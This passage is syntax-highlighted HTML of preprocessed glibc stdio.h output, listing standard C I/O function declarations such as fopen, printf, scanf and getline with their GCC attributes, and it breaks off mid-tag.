<span class="hljs-title function_">rename</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__old, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__new)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span>;<br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">renameat</span> <span class="hljs-params">(<span class="hljs-type">int</span> __oldfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__old, <span class="hljs-type">int</span> __newfd,</span><br><span class="hljs-params">       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__new)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span>;<br># <span class="hljs-number">184</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fclose</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br># <span class="hljs-number">194</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-title function_">tmpfile</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__ (fclose, <span class="hljs-number">1</span>)))</span> ;<br># <span class="hljs-number">211</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">tmpnam</span> <span class="hljs-params">(<span class="hljs-type">char</span>[<span class="hljs-number">20</span>])</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> ;<br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">tmpnam_r</span> <span class="hljs-params">(<span class="hljs-type">char</span> __s[<span class="hljs-number">20</span>])</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> ;<br># <span class="hljs-number">228</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">tempnam</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__dir, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__pfx)</span><br>   __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__ (__builtin_free, <span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fflush</span> <span class="hljs-params">(FILE *__stream)</span>;<br># <span class="hljs-number">245</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fflush_unlocked</span> <span class="hljs-params">(FILE *__stream)</span>;<br># <span class="hljs-number">264</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-title function_">fopen</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __filename,</span><br><span class="hljs-params">      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __modes)</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__ (fclose, <span class="hljs-number">1</span>)))</span> ;<br><br><br><br><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-title function_">freopen</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __filename,</span><br><span class="hljs-params">        <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __modes,</span><br><span class="hljs-params">        FILE *__restrict __stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">3</span>)))</span>;<br># <span class="hljs-number">299</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-title function_">fdopen</span> <span class="hljs-params">(<span class="hljs-type">int</span> __fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__modes)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__ (fclose, <span class="hljs-number">1</span>)))</span> ;<br><br><br><br><br><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-title function_">fopencookie</span> <span class="hljs-params">(<span class="hljs-type">void</span> *__restrict __magic_cookie,</span><br><span class="hljs-params">     <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __modes,</span><br><span class="hljs-params">     <span class="hljs-type">cookie_io_functions_t</span> __io_funcs)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__ (fclose, <span class="hljs-number">1</span>)))</span> ;<br><br><br><br><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-title function_">fmemopen</span> <span class="hljs-params">(<span class="hljs-type">void</span> *__s, <span class="hljs-type">size_t</span> __len, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__modes)</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__ (fclose, <span class="hljs-number">1</span>)))</span> ;<br><br><br><br><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-title function_">open_memstream</span> <span class="hljs-params">(<span class="hljs-type">char</span> **__bufloc, <span class="hljs-type">size_t</span> *__sizeloc)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__ (fclose, <span class="hljs-number">1</span>)))</span> ;<br># <span class="hljs-number">334</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">setbuf</span> <span class="hljs-params">(FILE *__restrict __stream, <span class="hljs-type">char</span> *__restrict __buf)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">setvbuf</span> <span class="hljs-params">(FILE *__restrict __stream, <span class="hljs-type">char</span> *__restrict __buf,</span><br><span class="hljs-params">      <span class="hljs-type">int</span> __modes, <span class="hljs-type">size_t</span> __n)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">setbuffer</span> <span class="hljs-params">(FILE *__restrict __stream, <span class="hljs-type">char</span> *__restrict __buf,</span><br><span class="hljs-params">         <span class="hljs-type">size_t</span> __size)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">setlinebuf</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fprintf</span> <span class="hljs-params">(FILE *__restrict __stream,</span><br><span class="hljs-params">      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, ...)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">printf</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, ...)</span>;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sprintf</span> <span class="hljs-params">(<span class="hljs-type">char</span> *__restrict __s,</span><br><span class="hljs-params">      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, ...)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__))</span>;<br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vfprintf</span> <span class="hljs-params">(FILE *__restrict __s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format,</span><br><span class="hljs-params">       __gnuc_va_list __arg)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vprintf</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, __gnuc_va_list __arg)</span>;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vsprintf</span> <span class="hljs-params">(<span class="hljs-type">char</span> *__restrict __s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format,</span><br><span class="hljs-params">       __gnuc_va_list __arg)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__))</span>;<br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">snprintf</span> <span class="hljs-params">(<span class="hljs-type">char</span> *__restrict __s, <span class="hljs-type">size_t</span> __maxlen,</span><br><span class="hljs-params">       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, ...)</span><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__printf__, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>)))</span>;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vsnprintf</span> <span class="hljs-params">(<span class="hljs-type">char</span> *__restrict __s, <span class="hljs-type">size_t</span> __maxlen,</span><br><span class="hljs-params">        <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, __gnuc_va_list __arg)</span><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__printf__, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>)))</span>;<br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vasprintf</span> <span class="hljs-params">(<span class="hljs-type">char</span> **__restrict __ptr, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __f,</span><br><span class="hljs-params">        __gnuc_va_list __arg)</span><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__printf__, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)))</span> ;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> __asprintf (<span class="hljs-type">char</span> **__restrict __ptr,<br>         <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __fmt, ...)<br>     __attribute__ ((__nothrow__)) __attribute__ ((__format__ (__printf__, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>))) ;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">asprintf</span> <span class="hljs-params">(<span class="hljs-type">char</span> **__restrict __ptr,</span><br><span class="hljs-params">       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __fmt, ...)</span><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__printf__, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)))</span> ;<br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vdprintf</span> <span class="hljs-params">(<span class="hljs-type">int</span> __fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __fmt,</span><br><span class="hljs-params">       __gnuc_va_list __arg)</span><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__printf__, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)))</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">dprintf</span> <span class="hljs-params">(<span class="hljs-type">int</span> __fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __fmt, ...)</span><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__printf__, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)))</span>;<br><br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fscanf</span> <span class="hljs-params">(FILE *__restrict __stream,</span><br><span class="hljs-params">     <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, ...)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">scanf</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, ...)</span> ;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sscanf</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __s,</span><br><span class="hljs-params">     <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, ...)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span>;<br><br><br><br><br><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/floatn.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">119</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/floatn.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/floatn-common.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">24</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/floatn-common.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">1</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/long-double.h&quot;</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">25</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/floatn-common.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">120</span> <span class="hljs-string">&quot;/usr/include/x86_64-linux-gnu/bits/floatn.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">438</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br># <span class="hljs-number">463</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fscanf</span> <span class="hljs-params">(FILE *__restrict __stream, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, ...)</span> __<span class="hljs-title function_">asm__</span> <span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;__isoc99_fscanf&quot;</span>)</span><br><br>                                __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">scanf</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, ...)</span> __<span class="hljs-title function_">asm__</span> <span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;__isoc99_scanf&quot;</span>)</span><br>                              ;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sscanf</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, ...)</span> __<span class="hljs-title function_">asm__</span> <span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;__isoc99_sscanf&quot;</span>)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span><br><br>                      ;<br># <span class="hljs-number">490</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vfscanf</span> <span class="hljs-params">(FILE *__restrict __s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format,</span><br><span class="hljs-params">      __gnuc_va_list __arg)</span><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__scanf__, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vscanf</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, __gnuc_va_list __arg)</span><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__scanf__, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)))</span> ;<br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vsscanf</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __s,</span><br><span class="hljs-params">      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, __gnuc_va_list __arg)</span><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__scanf__, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)))</span>;<br># <span class="hljs-number">540</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vfscanf</span> <span class="hljs-params">(FILE *__restrict __s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, __gnuc_va_list __arg)</span> __<span class="hljs-title function_">asm__</span> <span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;__isoc99_vfscanf&quot;</span>)</span><br><br><br><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__scanf__, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vscanf</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, __gnuc_va_list __arg)</span> __<span class="hljs-title function_">asm__</span> <span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;__isoc99_vscanf&quot;</span>)</span><br><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__scanf__, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)))</span> ;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vsscanf</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __s, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __format, __gnuc_va_list __arg)</span> __<span class="hljs-title function_">asm__</span> <span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;__isoc99_vsscanf&quot;</span>)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span><br><br><br><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__format__ (__scanf__, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)))</span>;<br># <span class="hljs-number">575</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fgetc</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getc</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getchar</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getc_unlocked</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getchar_unlocked</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br># <span class="hljs-number">600</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fgetc_unlocked</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br># <span class="hljs-number">611</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fputc</span> <span class="hljs-params">(<span class="hljs-type">int</span> __c, FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">2</span>)))</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">putc</span> <span class="hljs-params">(<span class="hljs-type">int</span> __c, FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">2</span>)))</span>;<br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">putchar</span> <span class="hljs-params">(<span class="hljs-type">int</span> __c)</span>;<br># <span class="hljs-number">627</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fputc_unlocked</span> <span class="hljs-params">(<span class="hljs-type">int</span> __c, FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">2</span>)))</span>;<br><br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">putc_unlocked</span> <span class="hljs-params">(<span class="hljs-type">int</span> __c, FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">2</span>)))</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">putchar_unlocked</span> <span class="hljs-params">(<span class="hljs-type">int</span> __c)</span>;<br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getw</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">putw</span> <span class="hljs-params">(<span class="hljs-type">int</span> __w, FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">2</span>)))</span>;<br><br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">fgets</span> <span class="hljs-params">(<span class="hljs-type">char</span> *__restrict __s, <span class="hljs-type">int</span> __n, FILE *__restrict __stream)</span><br>     __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__access__ (__write_only__, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">3</span>)))</span>;<br># <span class="hljs-number">694</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">__ssize_t</span> __getdelim (<span class="hljs-type">char</span> **__restrict __lineptr,<br>                             <span class="hljs-type">size_t</span> *__restrict __n, <span class="hljs-type">int</span> __delimiter,<br>                             FILE *__restrict __stream) __attribute__ ((__nonnull__ (<span class="hljs-number">4</span>)));<br><span class="hljs-keyword">extern</span> <span class="hljs-type">__ssize_t</span> <span class="hljs-title function_">getdelim</span> <span class="hljs-params">(<span class="hljs-type">char</span> **__restrict __lineptr,</span><br><span class="hljs-params">                           <span class="hljs-type">size_t</span> *__restrict __n, <span class="hljs-type">int</span> __delimiter,</span><br><span class="hljs-params">                           FILE *__restrict __stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">4</span>)))</span>;<br><br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">__ssize_t</span> <span class="hljs-title function_">getline</span> <span class="hljs-params">(<span class="hljs-type">char</span> **__restrict __lineptr,</span><br><span class="hljs-params">                          <span class="hljs-type">size_t</span> *__restrict __n,</span><br><span class="hljs-params">                          FILE *__restrict __stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">3</span>)))</span>;<br><br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fputs</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__restrict __s, FILE *__restrict __stream)</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">2</span>)))</span>;<br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">puts</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__s)</span>;<br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span 